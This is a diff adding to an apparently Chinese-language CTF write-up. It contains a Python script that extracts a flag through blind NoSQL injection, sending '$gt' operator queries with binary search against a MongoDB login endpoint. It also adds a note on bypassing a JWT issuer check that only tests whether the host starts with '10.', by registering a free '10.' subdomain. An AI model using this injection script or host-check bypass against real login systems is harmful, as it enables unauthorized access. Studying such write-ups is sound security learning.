@@ -65,10 +65,53 @@ const filter = (input) => {
 
 
 ```python
+import requests
+
+url="http://34.132.166.199:5249/login"
+
+flag="squ1rrel{7h0ugh7_y0u_c0u1d_rege"
+
+for i in range(1000):
+    min=0
+    max=127
+    mid=(min+max)//2
+    while max > min:
+        mid = (min+max)//2
+        data={
+            "username": "admin",
+            "password": {
+                "$gt":flag+chr(mid)
+            }
+        }
+        print(data)
+        result=requests.post(url,json=data)
+        if (result.status_code==400):
+            max=mid
+        else:
+            min=mid+1
+        mid = (min+max)//2
+    flag+=chr(mid-1)
+    print(flag)
+
 
 ```
 
 切片,拼接在mongodb查询里也不能用...
+
+
+---
+
+
+### web/Key Server
+一个jwt校验,公钥可以从url中读取,
+```js
+    if (!issuer.host.startsWith("10.")) {
+        return res.status(401).send("Invalid IP address");
+    }
+```
+https://dnsexit.com/domains/free-second-level-domains/
+host是主机名不是ip,可以申请一个免费的二级域名 `10.publicvm.com`
+
 
 # reverse
 
